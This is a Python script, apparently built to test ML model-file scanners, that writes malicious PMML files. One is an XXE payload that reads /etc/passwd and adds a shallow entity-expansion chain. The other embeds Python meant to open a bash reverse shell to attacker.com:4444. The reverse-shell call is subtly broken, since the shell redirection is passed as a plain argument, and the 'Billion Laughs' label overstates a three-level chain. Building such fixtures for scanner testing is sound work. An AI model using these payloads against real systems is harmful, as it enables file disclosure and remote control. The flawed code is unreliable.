"""
PMML Attack Vector Generator

Generates attack vectors for PMML files (.pmml)
"""

import json
from pathlib import Path
from typing import List, Dict, Tuple


class PMMLAttackGenerator:
    """Generate PMML-specific attack vectors."""
    
    def __init__(self, output_dir: str = "./output"):
        """Initialize the PMML attack generator."""
        self.output_dir = Path(output_dir) / "pmml_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []
    
    def generate_xxe_attack(self) -> Tuple[str, int]:
        """Generate PMML with XXE vulnerability.
        
        Attack Vector:
            PMML XML with:
            1. DOCTYPE declaration with ENTITY
            2. External DTD reference
            3. Billion Laughs expansion
            4. File inclusion via XXE
        
        Impact: Information disclosure, RCE
        Severity: CRITICAL
        Detection: DTD disabling, entity expansion limits
        
        Returns:
            Tuple of (filepath, num_xxe_payloads)
        """
        filepath = self.output_dir / "01_xxe_attack.xml"
        
        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE pmml [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<PMML version="4.3">
  <DataDictionary numberOfFields="1">
    <DataField name="&xxe;" optype="categorical"/>
  </DataDictionary>
  <TreeModel>
    <Node score="&lol3;"/>
  </TreeModel>
</PMML>
        """
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(xxe_payload)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 2
    
    def generate_embedded_script_rce(self) -> Tuple[str, int]:
        """Generate PMML with embedded executable script.
        
        Attack Vector:
            PMML extension with:
            1. JavaScript code in extension
            2. Python code in custom elements
            3. Bash script execution
            4. Code evaluation on model load
        
        Impact: Code execution
        Severity: CRITICAL
        Detection: Script content filtering
        
        Returns:
            Tuple of (filepath, num_scripts)
        """
        filepath = self.output_dir / "02_embedded_script.xml"
        
        script_payload = """<?xml version="1.0"?>
<PMML xmlns="http://www.dmg.org/PMML-4_3" version="4.3">
  <Extension name="malicious">
    <![CDATA[
    import subprocess
    subprocess.call(['bash', '-i', '>& /dev/tcp/attacker.com/4444 0>&1'])
    ]]>
  </Extension>
  <DataDictionary numberOfFields="1">
    <DataField name="input" optype="continuous"/>
  </DataDictionary>
</PMML>
        """
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(script_payload)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 1
    
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all PMML attack vectors."""
        results = {
            "xxe_attack": self.generate_xxe_attack(),
            "embedded_script": self.generate_embedded_script_rce(),
        }
        return results
    
    def get_generated_files(self) -> List[str]:
        """Get list of all generated files."""
        return self.generated_files


if __name__ == "__main__":
    generator = PMMLAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
